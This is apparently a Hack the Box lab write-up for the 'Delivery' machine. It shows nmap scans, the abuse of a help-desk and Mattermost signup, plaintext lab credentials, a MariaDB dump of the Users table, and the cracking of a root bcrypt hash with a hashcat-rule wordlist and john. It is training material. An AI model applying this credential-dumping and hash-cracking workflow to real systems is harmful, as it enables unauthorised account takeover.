# Hack the Box - Delivery

# NMAP
```CSS
▶ nmap -Pn -sS -O -p- 10.10.10.222 -T4 --min-rate 1000 -oN ports.nmap

Nmap scan report for 10.10.10.222
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8065/tcp open  unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/16%OT=22%CT=1%CU=42898%PV=Y%DS=2%DC=I%G=Y%TM=64635BE
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.54 seconds
```

```CSS
▶ nmap -sC -sV -p 22,80,8065 10.10.10.222 -oN services.nmap  

Nmap scan report for 10.10.10.222
Host is up (0.18s latency).                                                                                                                                                                                          
PORT     STATE SERVICE VERSION                                                       
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)     
| ssh-hostkey:                                                                       
|   2048 9c40fa859b01acac0ebc0c19518aee27 (RSA)                           
|   256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA)                          
|_  256 b79df7489da2f27630fd42d3353a808c (ED25519)                        
80/tcp   open  http    nginx 1.14.2                                                  
|_http-title: Welcome                                                                
|_http-server-header: nginx/1.14.2                                                   
8065/tcp open  unknown                                                               
| fingerprint-strings:                                                               
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request                                                       
|     Content-Type: text/plain; charset=utf-8                             
|     Connection: close                                                              
|     Request                                                                        
|   GetRequest:                                                                      
|     HTTP/1.0 200 OK                                                                
|     Accept-Ranges: bytes                                                           
|     Cache-Control: no-cache, max-age=31556926, public                   
|     Content-Length: 3108                                                           
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8                              
|     Last-Modified: Tue, 16 May 2023 10:28:07 GMT                        
|     X-Frame-Options: SAMEORIGIN                                                    
|     X-Request-Id: z3q9qbezs7gfxepeidwj65ac9a                            
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false  
|     Date: Tue, 16 May 2023 10:34:43 GMT                                            
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta n
ame="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name=
"application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Date: Tue, 16 May 2023 10:34:43 GMT                                                                                                                                  
|_    Content-Length: 0                                                              
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service 
:
SF-Port8065-TCP:V=7.93%I=7%D=5/16%Time=64635C5A%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,DF3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
SF:x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public\
SF:r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancesto
SF:rs\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Tue,\x2016\
SF:x20May\x202023\x2010:28:07\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\n
SF:X-Request-Id:\x20z3q9qbezs7gfxepeidwj65ac9a\r\nX-Version-Id:\x205\.30\.
SF:0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Tue,\x
SF:2016\x20May\x202023\x2010:34:43\x20GMT\r\n\r\n<!doctype\x20html><html\x
SF:20lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,initial-scale=1,maximum-scale=1,user
SF:-scalable=0\"><meta\x20name=\"robots\"\x20content=\"noindex,\x20nofollo
SF:w\"><meta\x20name=\"referrer\"\x20content=\"no-referrer\"><title>Matter
SF:most</title><meta\x20name=\"mobile-web-app-capable\"\x20content=\"yes\"
SF:><meta\x20name=\"application-name\"\x20content=\"Mattermost\"><meta\x20
SF:name=\"format-detection\"\x20content=\"telephone=no\"><link\x20re")%r(H
SF:TTPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x2
SF:0Tue,\x2016\x20May\x202023\x2010:34:43\x20GMT\r\nContent-Length:\x200\r
SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.38 seconds
```

## HTTP 80
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/aef9bd68-d0a6-4af6-93a4-fe18fd12b22c)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/82e2366e-0139-4724-b293-54d1cb35d987)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/2ed3b4cd-34a7-4c5b-91c8-dd3ac1e7b0f3)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/13d820fd-0ae2-4f27-b60d-1ca82feef356)

## TCP 8065
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/38815e4f-c1c6-4e60-930a-5a956685abd8)

Open a new Ticket:
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ee609bc3-dc30-4fe7-a05b-da27d6bc4f57)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/3a54c263-65ec-47eb-ab8f-209316434399)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1278222e-db9d-4081-94dd-6fca9eff1ec2)

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/8b1c0a6d-bb6f-447d-a96b-e3d8a35144db)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/3d9eb287-2605-4189-b583-60155a5d0e53)

Create an Account
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/35f27b2a-9984-466b-ac45-170b9d83b058)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/966270ab-7a1a-41d7-8b95-b419b416add1)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f81f5baa-610f-4dd7-a79a-71311a3e8390)

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/91b344e6-784e-4044-85da-1de23b71d156)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5179072c-b983-4cba-872f-c1eb67e15e8d)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/959d707a-f266-48fa-8969-e31b4aef9f8a)

```CSS
Credentials:
maildeliverer:Youve_G0t_Mail!
```

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/28b8100d-63d4-44b1-8536-ae44594e5bdb)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/868f65f3-02eb-47f8-aecb-226bde25b597)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/03bd8f52-0cf2-4365-a8b2-b3af163134e9)

```CSS
Credentials:
mmuser:Crack_The_MM_Admin_PW
```

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/522fe846-6930-4645-bd83-cf4c9df80cf8)
```CSS
show databases;                                                                                                                                          +--------------------+    
| Database           |                                                                                                                                                     
+--------------------+  
| information_schema |
| mattermost         |                                                                                                                                                     
+--------------------+
2 rows in set (0.001 sec)                                                                                                                                                  
                                                                                                                                                                           MariaDB [(none)]> use mattermost;                                                                                                                                          Reading table information for completion of table and column names                                                                                                         You can turn off this feature to get a quicker startup with -A                                                                                                             
                                                                                                                                                                           
Database changed                                                                                                                                                           MariaDB [mattermost]> show tables;
+------------------------+
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
| ChannelMemberHistory   |
| ChannelMembers         |
| ----SNIP----           |
| UserTermsOfService     |
| Users                  |
+------------------------+
MariaDB [mattermost]> select * from Users;                                            
```

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/17873cd0-020e-4c2d-a9a4-06771efa337c)

```
▶ echo "root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO" >> root.hash
```

Generate a wordlist based on word "PleaseSubscribe!" using hashcat to crack the password hash of the root user.
```CSS
echo PleaseSubscribe! | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout | tee password.lst
```
```CSS
▶ john root.hash --wordlist=password.lst
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/205130d9-bb01-4d2b-b792-05aafcc2ba40)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/7702b958-100b-47f2-8f76-ac13947d3c8e)
